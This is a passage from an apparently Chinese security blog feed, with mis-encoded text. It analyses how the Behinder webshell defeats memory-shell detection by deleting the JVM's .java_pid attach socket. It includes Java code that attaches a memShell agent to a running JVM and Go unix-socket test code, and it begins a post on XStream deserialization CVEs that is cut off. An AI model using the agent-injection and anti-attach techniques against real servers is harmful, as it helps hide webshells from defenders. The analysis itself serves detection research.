class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æµ‹è¯•AntiAgent"><a href="#æµ‹è¯•AntiAgent" class="headerlink" title="æµ‹è¯•AntiAgent"></a>æµ‹è¯•AntiAgent</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">testAttach</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            String pid = <span class="string">&quot;2715&quot;</span>;</span><br><span class="line">            System.out.println(System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>));</span><br><span class="line">            String password = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line">            String currentPath = <span class="string">&quot;/Users/mody/study/java/MemShell/memShell/target/&quot;</span>;</span><br><span class="line">            String agentFile = currentPath + <span class="string">&quot;agent.jar&quot;</span>;</span><br><span class="line">            agentFile = <span class="keyword">new</span> File(agentFile).getCanonicalPath();</span><br><span class="line">            String agentArgs = currentPath;</span><br><span class="line">            <span class="keyword">if</span> (!password.equals(<span class="string">&quot;&quot;</span>) || password != <span class="keyword">null</span>) &#123;</span><br><span class="line">                agentArgs = agentArgs + <span class="string">&quot;^&quot;</span> + password;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            VirtualMachine vm = VirtualMachine.attach(pid);</span><br><span class="line">            vm.loadAgent(agentFile, agentArgs);</span><br><span class="line">            String fileName = System.getProperty(<span class="string">&quot;java.io.tmpdir&quot;</span>)+<span class="string">&quot;.java_pid&quot;</span> + pid;</span><br><span class="line">            System.out.println(fileName);</span><br><span class="line">            Boolean e = (<span class="keyword">new</span> File(fileName)).exists();</span><br><span class="line">            System.out.println(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">            var12.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="comment">//            (new File(libPath)).delete();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><ol><li>æ‰¾ä¸€ä¸ªjvmè¿›ç¨‹ï¼Œè¿è¡ŒtestAttach</li><li>åˆ é™¤å¯¹åº”.java_pidxx</li><li>å†è¿è¡ŒtestAttachï¼Œä¼šå‘ç°æŠ¥é”™ï¼Œsocketè¿ä¸ä¸Š</li></ol><p>å¯ä»¥çœ‹å‡ºï¼Œå†°èé€šè¿‡åˆ é™¤.java_pidï¼Œå®ç°äº†æ— æ³•VirtualMachine.attachã€‚åŸç†å¦‚ä½•ï¼Ÿæ£€æµ‹æ˜¯å¦æœ‰ç»•è¿‡ç©ºé—´ï¼Ÿ</p><h2 id="Java-Attachæœºåˆ¶"><a href="#Java-Attachæœºåˆ¶" class="headerlink" title="Java Attachæœºåˆ¶"></a>Java Attachæœºåˆ¶</h2><p>å‚è€ƒã€1ã€‘ä¸­æ€»ç»“äº†Java çš„3ç§åŠ¨æ€Attachæ–¹æ³•</p><ol><li>ç»§æ‰¿Tool/HotSpotAgent.attachï¼ˆé‡‡ç”¨Serviceability Agentï¼Œç®€ç§°SAï¼‰</li><li>VirtualMachine.attachï¼ˆAttachåˆ°Attach Listenerçº¿ç¨‹åæ‰§è¡Œæœ‰é™å‘½ä»¤ï¼‰</li><li>Perf.getPerf().attachï¼ˆé€šè¿‡PerfDataæ–‡ä»¶è·å–ä¿¡æ¯ï¼‰</li></ol><p><img src="/images/pasted-146.png" alt="upload successful"></p><p>å…¶ä¸­1ä¼šæš‚åœè¿›ç¨‹ï¼Œä¸é€‚ç”¨äºå†…å­˜é©¬çš„æ£€æµ‹ï¼Œ3åªæ˜¯å…³æ³¨è¿›ç¨‹çŠ¶æ€ä¿¡æ¯ï¼Œä¸»è¦ç”¨äºæ€§èƒ½åˆ†æï¼Œå…³æ³¨çš„ç±»ä¸å…¨ï¼Œæ— æ³•ç”¨äºæ£€æµ‹å¼‚å¸¸ç±»ã€‚</p><h3 id="Java-Instrumentation-API"><a href="#Java-Instrumentation-API" class="headerlink" title="Java Instrumentation API"></a>Java Instrumentation API</h3><p>å¼•ç”¨å‚è€ƒã€10ã€‘ï¼ŒJava Instrumentation APiæ”¯æŒå¯åŠ¨æ—¶/è¿è¡Œæ—¶Attach Agent</p><p>å¦‚æœéœ€è¦åœ¨ç›®æ ‡JVMå¯åŠ¨çš„åŒæ—¶åŠ è½½Agentï¼Œéœ€è¦åœ¨Agentä¸­å®ç°ä¸‹é¢çš„æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1] public static void premain(String agentArgs, Instrumentation inst);</span><br><span class="line">[2] public static void premain(String agentArgs);</span><br></pre></td></tr></table></figure><p>å¦‚æœå¸Œæœ›åœ¨ç›®æ ‡JVMè¿è¡Œæ—¶åŠ è½½Agentï¼Œåˆ™éœ€è¦å®ç°ä¸‹é¢çš„æ–¹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[1] public static void agentmain(String agentArgs, Instrumentation inst);</span><br><span class="line">[2] public static void agentmain(String agentArgs);</span><br></pre></td></tr></table></figure><p>æœ¬æ–‡åªå…³æ³¨è¿è¡Œæ—¶åŠ è½½Agentï¼Œä¹Ÿå°±æ˜¯VirtualMachine.attachã€‚</p><h3 id="VirtualMachine-attach"><a href="#VirtualMachine-attach" class="headerlink" title="VirtualMachine.attach"></a>VirtualMachine.attach</h3><p><img src="/images/pasted-145.png" alt="upload successful"><br>æ­¤æµç¨‹å›¾éœ€è¦æ­é…å‚è€ƒã€3ã€‘ä¸­çš„è°ƒè¯•è¿‡ç¨‹ï¼Œåˆ†æå¾—å‡º</p><p>JVM æµç¨‹</p><ol><li>init, ç­‰å¾…SIGQUITï¼ˆä¹Ÿæ˜¯SIGBREAKï¼‰</li><li>æ”¶åˆ°SINQUITï¼Œattach_pidéªŒè¯ï¼ˆè¿™ä¸ªä¸æ˜¯å¾ˆé‡è¦ï¼‰</li><li>åˆ¤æ–­æ˜¯å¦æœ‰å¯¹åº”java_pid socketæ–‡ä»¶ï¼Œæ²¡æœ‰åˆ™åˆ›å»º</li><li>å»ºç«‹unix socket tcp server ,ç»‘å®šjava_pid socketé€šé“</li><li>è¿›å…¥å¾ªç¯ï¼Œå“åº”attach client</li><li>æ–°SIGQUITï¼ŒéªŒè¯attach_pid(ä¸é‡è¦), è¿›å…¥5ï¼ˆé‡ç‚¹ï¼Œå¹¶ä¸ä¼šé‡æ–°å»ºserverï¼‰</li></ol><p>åœ¨æ­¥éª¤5å®Œæˆä¹‹åï¼Œåˆ é™¤æ‰java_pid socketæ–‡ä»¶ï¼Œä¼šæ€æ ·ï¼Ÿå¯æ¢å¤å—ï¼Ÿ</p><ol><li>å³ä½¿åˆ é™¤socketé€šé“ï¼Œserverä¸ä¼šå¤±è´¥é‡æ–°å°è¯•è¿æ¥</li><li>å³ä½¿æ–°å»ºç›¸åŒnameçš„unix socketé€šé“ï¼Œclientä¹Ÿæ— æ³•è¿æ¥ï¼Œæ‰€ä»¥ä¸å¯æ¢å¤</li></ol><h3 id="UnixSocket"><a href="#UnixSocket" class="headerlink" title="UnixSocket"></a>UnixSocket</h3><p>ä»¥ä¸‹é€šè¿‡å®éªŒéªŒè¯ä»¥ä¸Šçš„ä¸¤ç‚¹ç»“è®º</p><p>server.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¥æ”¶å†…å®¹å¹¶è¿”å›ç»“æœ</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HandleServerContext</span><span class="params">(context <span class="keyword">string</span>)</span> <span class="title">string</span></span> &#123;</span><br><span class="line">now := time.Now().String()</span><br><span class="line"><span class="keyword">return</span> now</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ¥æ”¶è¿æ¥å¹¶å¤„ç†</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">HandleServerConn</span><span class="params">(c net.Conn)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> c.Close()</span><br><span class="line">bufsize := <span class="number">32</span></span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, bufsize)</span><br><span class="line">nr, err := c.Read(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Read: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// è¿™é‡Œï¼Œä½ éœ€è¦ parse buf é‡Œçš„æ•°æ®æ¥å†³å®šè¿”å›ä»€ä¹ˆç»™å®¢æˆ·ç«¯</span></span><br><span class="line"><span class="comment">// å‡è®¾ respnoseData æ˜¯ä½ æƒ³è¿”å›çš„æ–‡ä»¶å†…å®¹</span></span><br><span class="line">fmt.Print(<span class="keyword">string</span>(buf[<span class="number">0</span>:nr]))</span><br><span class="line">result := HandleServerContext(<span class="keyword">string</span>(buf[<span class="number">0</span>:nr]))</span><br><span class="line">_, err = c.Write([]<span class="keyword">byte</span>(result))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Writes failed.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Print(result)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s_filename := <span class="string">&quot;/var/folders/vw/5c9ynmt1277dbnmrxjq8hzn40000gq/T/.java_pid10021&quot;</span></span><br><span class="line">addr, err := net.ResolveUnixAddr(<span class="string">&quot;unix&quot;</span>, s_filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Cannot resolve unix addr: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line">listener, err := net.ListenUnix(<span class="string">&quot;unix&quot;</span>, addr)</span><br><span class="line"><span class="keyword">defer</span> listener.Close()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Cannot listen to unix domain socket: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;Listening on&quot;</span>, listener.Addr())</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">c, err := listener.Accept()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Accept: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> HandleServerConn(c)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>client.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">s_filename := <span class="string">&quot;/var/folders/vw/5c9ynmt1277dbnmrxjq8hzn40000gq/T/.java_pid10021&quot;</span></span><br><span class="line">addr, err := net.ResolveUnixAddr(<span class="string">&quot;unix&quot;</span>, s_filename)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Cannot resolve unix addr: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//æ‹”å·</span></span><br><span class="line">c, err := net.DialUnix(<span class="string">&quot;unix&quot;</span>, <span class="literal">nil</span>, addr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;DialUnix failed.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å†™å‡º</span></span><br><span class="line">context := <span class="string">&quot;hello server&quot;</span></span><br><span class="line">_, err = c.Write([]<span class="keyword">byte</span>(context))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Writes failed.&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//è¯»ç»“æœ</span></span><br><span class="line">bufsize := <span class="number">32</span></span><br><span class="line">buf := <span class="built_in">make</span>([]<span class="keyword">byte</span>, bufsize)</span><br><span class="line">nr, err := c.Read(buf)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(<span class="string">&quot;Read: &quot;</span> + err.Error())</span><br><span class="line">&#125;</span><br><span class="line">fmt.Printf(<span class="keyword">string</span>(buf[<span class="number">0</span>:nr]))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>è¿è¡Œserver</li><li>è¿è¡Œclientï¼Œtcpè¿æ¥okï¼Œæ•°æ®ä¼ è¾“ok</li><li>åˆ é™¤java_pid</li><li>è¿è¡Œclientï¼Œtcpè¿æ¥å¤±è´¥</li><li>nc -lkU java_pidï¼Œåˆ›å»ºç›¸åŒæ–‡ä»¶</li><li>è¿è¡Œclientï¼Œä»ç„¶è¿æ¥å¤±è´¥</li></ol><h3 id="JVMä¿¡å·"><a href="#JVMä¿¡å·" class="headerlink" title="JVMä¿¡å·"></a>JVMä¿¡å·</h3><p>å¦‚ä¸Šï¼Œé€šè¿‡æ¢å¤java_pidé‡å»ºè¿æ¥çš„æ€è·¯æ— æ³•èµ°é€šï¼Œé‚£æœ‰å…¶ä»–çš„æ€è·¯é‡æ–°è®©jvmå»ºç«‹æ–°çš„tcp serverå—ï¼Ÿ</p><p>ç¬¬ä¸€æ­¥æ—¶æ˜¯é€šè¿‡SIGQUITä¿¡å·è§¦å‘jvm init tcp serverçš„ï¼Œæœ‰æ²¡æœ‰å…¶ä»–ä¿¡å·å¯ä»¥é‡ç°å‘¢ï¼Ÿå¯æƒœé€šè¿‡å‚è€ƒã€4ã€‘ï¼Œå¹¶æœªå‘ç°æœ‰å¦‚æ­¤åŠŸèƒ½çš„ä¿¡å·ã€‚</p><h2 id="å°ç»“"><a href="#å°ç»“" class="headerlink" title="å°ç»“"></a>å°ç»“</h2><p>æœ¬æ–‡å¤ç°äº†å†°èä¸ºé˜²æ­¢å¸¸è§å†…å­˜é©¬æ£€æµ‹antiAgentçš„åŠŸèƒ½ï¼ˆä¸å¾—ä¸è†œæ‹œbeyondå¤§ä½¬ï¼Œå¯¹Javaå®åœ¨æ˜¯ç†Ÿæ‚‰ï¼‰ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šåˆ†æå…¶å®ç°åŸç†ï¼Œå¾—å‡ºæ— æ³•ç»•è¿‡çš„æ‚²æƒ…ç»“è®ºã€‚</p><p>ä¸è¿‡æ— æ³•Attachæœ¬èº«å°±æ˜¯ä¸€ä¸ªå¼ºç‰¹å¾ï¼ˆè™½ç„¶æœ‰äº›/tmpç›®å½•æ¸…ç†ä¼šå¯¼è‡´è¯¯æŠ¥ï¼‰ï¼Œä¹Ÿä½¿å¾—antiAgentæœ‰åˆ©æœ‰å¼Šï¼Œæ”»å‡»è€…ä¹Ÿéœ€è¦æ–Ÿé…Œè€Œç”¨ã€‚</p><p>æ°´å¹³æœ‰é™ï¼Œå¦‚æœ‰ç–æ¼ï¼Œæ³è¯·å‘ŠçŸ¥ã€‚</p><p>â€”â€”â€”â€“20210624è¡¥å……â€”â€”â€”â€”</p><p>å‚è€ƒã€11ã€‘ä¸­å¸¦å¤´å¤§å“¥ è¡¥å……äº†å…³äºå†°è3.0beta8ç‰ˆæœ¬windowsçš„å®ç°ï¼ŒAntiAttachåŸç†æ˜¯é€šè¿‡å…³é—­sun.tools.attach.WindowsVirtualMachine pipeï¼Œå¸¦å¤´å¤§å“¥ é€šè¿‡åˆ†æWindowsVirtualMachine JNIçš„å®ç°å¾—å‡ºï¼š</p><blockquote><p>WindowsVirtualMachineæ˜¯é€šè¿‡å‘ç›®æ ‡JVMæ³¨å…¥shellcodeæ¥æ‰§è¡Œæˆ‘ä»¬ä¸ç›®æ ‡JVMçš„é€šä¿¡æŒ‡ä»¤ã€‚Pipeåªæ˜¯ä¸€ç§é€šä¿¡æ‰‹æ®µï¼Œå…³é—­pipeå¹¶ä¸èƒ½å½±å“æˆ‘ä»¬å‘ç›®æ ‡JVMåŠ è½½javaagentã€‚</p></blockquote><p>å¤§å“¥66çš„</p><p>åœ¨linuxä¾§ï¼Œè½¬åŒ–ä¸ºçš„é—®é¢˜æ˜¯ï¼šUnixSocketæ–‡ä»¶åˆ é™¤ä¹‹åå¦‚ä½•æ¢å¤åŸæœ‰çš„serverè¿æ¥ï¼Ÿæœ¬æ–‡åªå°è¯•äº†æ–°å»ºåŒåsocketæ–‡ä»¶ï¼Œæˆ–è€…è¿˜æœ‰å…¶ä»–æ–¹å¼ï¼Ÿè¿™å—è¿˜æ˜¯èœğŸ”ï¼Œæ±‚çŸ¥é“çš„å¤§ä½¬ä»¬æŒ‡ç‚¹ã€‚</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li>[1]<a href="https://www.jianshu.com/p/542e50edc8e3">Java Attachæœºåˆ¶</a></li><li>[2]<a href="https://www.jianshu.com/p/5e1d3dab8534">RASPç ”å‘è¸©å‘ä¹‹attachå¤±è´¥</a></li><li>[3]<a href="https://mp.weixin.qq.com/s?__biz=MzIzNjI1ODc2OA==&mid=2650886799&idx=1&sn=108c5fdfcd2695594d4f80ff02fc9a70&mpshare=1&scene=21&srcid=0114WsKpUmDXhRtqy8x7JX5w#wechat_redirect">JVMæºç åˆ†æä¹‹Attachæœºåˆ¶å®ç°å®Œå…¨è§£è¯»</a></li><li>[4]<a href="https://www.ibm.com/docs/zh/sdk-java-technology/7?topic=hjps-signals-used-by-jvm">JVM æ‰€ä½¿ç”¨çš„ä¿¡å·</a></li><li>[5]<a href="https://stackoverflow.com/questions/5769877/attachnotsupportedexception-due-to-missing-java-pid-file-in-attach-api">AttachNotSupportedException due to missing java_pid file in Attach API</a></li><li>[6]<a href="https://club.perfma.com/article/1596501">ä½¿ç”¨Goè¯­è¨€å®ç°Attachåˆ°ç›®æ ‡JVMè¿›ç¨‹</a></li><li>[7]<a href="http://jrasp.com/boke/#java-attach-api-%E4%BB%8B%E7%BB%8D">Java InstrumentationåŸç†</a></li><li>[8]<a href="https://paper.seebug.org/1381/">Tomcat å†…å­˜é©¬æ£€æµ‹</a></li><li>[9]<a href="https://cloud.tencent.com/developer/article/1768499">æ‚è°ˆJavaå†…å­˜Webshellçš„æ”»ä¸é˜²</a></li><li>[10]<a href="https://cloud.tencent.com/developer/news/476186">JavaåŠ¨æ€è°ƒè¯•æŠ€æœ¯åŸç†åŠå®è·µ</a></li><li>[11]<a href="https://forum.butian.net/share/142">å†°èbeta8å†…å­˜é©¬é˜²æŸ¥æ€ç ´è§£</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;webshellçš„éšè—ä¸æ£€å‡ºä¸€ç›´ä»¥æ¥éƒ½æ˜¯æ”»é˜²çš„ç„¦ç‚¹ï¼Œéšç€å†…å­˜é©¬çš„ç ”ç©¶ä¸å·¥å…·çš„å…¬å¼€ï¼Œå†…å­˜shellå·²ç„¶æˆä¸ºäº†webshellä¸»æµã€‚&lt;/p&gt;
&lt;p&gt;å¼•ç”¨ã€9ã€‘ä¸­å…³äºæ”»å‡»çš„æ€è·¯&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;åŸºäºServletè§„èŒƒçš„åˆ©ç”¨ï¼ŒåŠ¨æ€æ³¨å†ŒServletè§„èŒƒä¸­çš„ç»„ä»¶ï¼ŒåŒ…æ‹¬Servletï¼ŒFilterï¼ŒListenerï¼Œè¿™éƒ¨åˆ†çš„å…¬å¼€æ–‡ç« æ¯”è¾ƒå¤šï¼Œæ¯”å¦‚ï¼šåŸºäºtomcatçš„å†…å­˜ Webshell æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ï¼ˆ&lt;a href=&quot;https://xz.aliyun.com/t/7388%EF%BC%89%E3%80%82&quot;&gt;https://xz.aliyun.com/t/7388ï¼‰ã€‚&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;åŸºäºç‰¹å®šæ¡†æ¶çš„åˆ©ç”¨ï¼Œæ¡†æ¶ä¸€èˆ¬å¯¹äºServletåˆè¿›è¡Œäº†ä¸€å±‚å°è£…ï¼ŒåŠ¨æ€æ³¨å†Œæ¡†æ¶çš„è·¯ç”±ï¼Œæ–‡ç« ï¼šåŸºäºå†…å­˜ Webshell çš„æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ç ”ç©¶ï¼ˆ&lt;a href=&quot;https://www.anquanke.com/post/id/198886%EF%BC%89&quot;&gt;https://www.anquanke.com/post/id/198886ï¼‰&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;åŸºäºjavaagentä¿®æ”¹Servletå¤„ç†æµç¨‹ä¸­çš„å­—èŠ‚ç ï¼Œå·¥å…·ï¼šmemShellï¼ˆ&lt;a href=&quot;https://github.com/rebeyond/memShell%EF%BC%89&quot;&gt;https://github.com/rebeyond/memShellï¼‰&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;å¼•ç”¨ã€8ã€‘ä¸­å…³äºæ£€æµ‹çš„æ€è·¯&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æ— è®ºæ˜¯ä»¥ä¸Šå“ªç§æ”»å‡»æ–¹å¼ï¼Œä»é˜²å®ˆæ–¹çš„è§’åº¦æ¥è¯´ï¼Œæ£€æµ‹çš„æ–¹å¼éƒ½æ˜¯é€šè¿‡java instrumentationæœºåˆ¶ï¼Œå°†æ£€æµ‹jaråŒ…attachåˆ°tomcat jvmï¼Œæ£€æŸ¥åŠ è½½åˆ°jvmä¸­çš„ç±»æ˜¯å¦å¼‚å¸¸ã€‚æ•´ä½“æ£€æµ‹æ€è·¯ä¸ºï¼š&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;è·å–tomcat jvmä¸­æ‰€æœ‰åŠ è½½çš„ç±»&lt;/li&gt;
&lt;li&gt;éå†æ¯ä¸ªç±»ï¼Œåˆ¤æ–­æ˜¯å¦ä¸ºé£é™©ç±»ã€‚æˆ‘ä»¬æŠŠå¯èƒ½è¢«æ”»å‡»æ–¹æ–°å¢/ä¿®æ”¹å†…å­˜ä¸­çš„ç±»ï¼Œæ ‡è®°ä¸ºé£é™©ç±»ï¼ˆæ¯”å¦‚å®ç°äº†filter/servletçš„ç±»ï¼‰&lt;/li&gt;
&lt;li&gt;éå†é£é™©ç±»ï¼Œæ£€æŸ¥æ˜¯å¦ä¸ºwebshellï¼š&lt;/li&gt;
&lt;li&gt;æ£€æŸ¥é«˜é£é™©ç±»çš„classæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼›&lt;/li&gt;
&lt;li&gt;åç¼–è¯‘é£é™©ç±»å­—èŠ‚ç ï¼Œæ£€æŸ¥javaæ–‡ä»¶ä¸­åŒ…å«æ¶æ„ä»£ç &lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;æœ‰æ”»æœ‰é˜²ï¼Œè€Œé˜²å¾¡åˆå¼•å‘æ”»å‡»çš„å‡çº§ï¼Œå†°èæœ€æ–°ç‰ˆå·²ç»åŠ å…¥äº†åVirtualMachine.AttachåŠŸèƒ½ã€‚&lt;/p&gt;</summary>
    
    
    
    <category term="Javaå®‰å…¨" scheme="http://m0d9.me/categories/Java%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="Java" scheme="http://m0d9.me/tags/Java/"/>
    
    <category term="å†°è" scheme="http://m0d9.me/tags/%E5%86%B0%E8%9D%8E/"/>
    
    <category term="Attach" scheme="http://m0d9.me/tags/Attach/"/>
    
  </entry>
  
  <entry>
    <title>XStreamååºåˆ—åŒ–è¯¦è§£ï¼ˆäºŒï¼‰</title>
    <link href="http://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
    <id>http://m0d9.me/2021/05/10/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%A6%E8%A7%A3%EF%BC%88%E4%BA%8C%EF%BC%89/</id>
    <published>2021-05-10T09:04:00.000Z</published>
    <updated>2021-06-07T03:49:25.032Z</updated>
    
    <content type="html"><![CDATA[<p>å‰æ–‡å·²ç»è®²è¿‡XStreamçš„ååºåˆ—åŒ–ç‰¹æ€§åŠæ¼æ´äº§ç”Ÿçš„åŸå› ï¼Œä»¥åŠ&lt;=1.4.6ç‰ˆæœ¬çš„å‡ ä¸ªgadgetï¼Œåœ¨æ­¤èƒŒæ™¯ä¸Šï¼Œæœ¬èŠ‚å‡†å¤‡å¤ç°æŠ«éœ²çš„å‡ ä¸ªRCE CVEï¼Œæ­£å‘åˆ†æä¸‹ã€‚</p><p>XStreamå›¢é˜Ÿå¾ˆæœ‰æ„æ€ï¼Œå®‰å…¨å…¬å‘Šä¼šæŠŠPOCä¹Ÿå…¬å¼€ï¼Œå…·ä½“å¯ä»¥çœ‹<a href="https://x-stream.github.io/security.html%E3%80%82">https://x-stream.github.io/security.htmlã€‚</a></p><h2 id="CVE-2020-26217"><a href="#CVE-2020-26217" class="headerlink" title="CVE-2020-26217"></a>CVE-2020-26217</h2><p>è¿™ä¸ªå…¶å®å°±æ˜¯Wh1t3p1gå¸ˆå‚…ä¸­æåˆ°çš„ç¬¬4ä¸ªImageIO gadgetï¼Œåœ¨marshalsec gadgets ImageIOä¸­ä¹Ÿæœ‰ï¼Œä¸‹é¢æ­£å‘è·Ÿè¸ªä¸‹ã€‚</p><h3 id="Wh1t3p1gå¸ˆå‚…çš„POC"><a href="#Wh1t3p1gå¸ˆå‚…çš„POC" class="headerlink" title="Wh1t3p1gå¸ˆå‚…çš„POC"></a>Wh1t3p1gå¸ˆå‚…çš„POC</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 